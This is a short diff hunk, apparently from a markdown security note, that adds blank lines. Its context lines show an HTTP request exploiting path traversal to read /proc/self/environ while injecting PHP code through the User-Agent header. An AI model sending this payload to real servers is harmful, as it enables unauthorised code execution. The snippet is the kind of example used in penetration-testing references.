@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:22:18.729885+00:00'
 GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
 User-Agent: <?=phpinfo(); ?>
 ```
+
+
